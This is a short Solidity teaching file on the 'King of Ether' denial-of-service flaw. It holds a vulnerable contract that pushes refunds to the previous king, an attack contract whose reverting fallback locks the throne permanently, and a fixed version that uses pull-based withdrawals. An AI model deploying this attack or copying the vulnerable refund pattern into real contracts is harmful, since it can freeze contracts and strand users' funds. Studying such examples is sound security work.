pragma solidity ^0.8.13;

contract KingOfEther {

    address public king;
    uint public balance;

    function claimThrone() external payable {

        require(msg.value > balance);

        (bool sent, ) = king.call{ value: balance }("");

        require(sent);

        balance = msg.value;

        king = msg.sender;
    }

}

contract Attack {

    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {

        kingOfEther = KingOfEther(_kingOfEther);
    }

    fallback() external payable {

        assert(false);
    }

    function attack() public payable {

        kingOfEther.claimThrone{ value: msg.value }();
    }

}


contract KingOfEtherSafe {

    address public king;
    uint public balance;

    mapping(address => uint) public balances;

    function claimThrone() external payable {

        require(msg.value > balance);

        balances[king] += balance;

        balance = msg.value;

        king = msg.sender;
    }

    function withdraw() public {

        require(msg.sender != king);

        uint amount = balances[msg.sender];

        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{ value: amount }("");

        require(sent);
    }

}
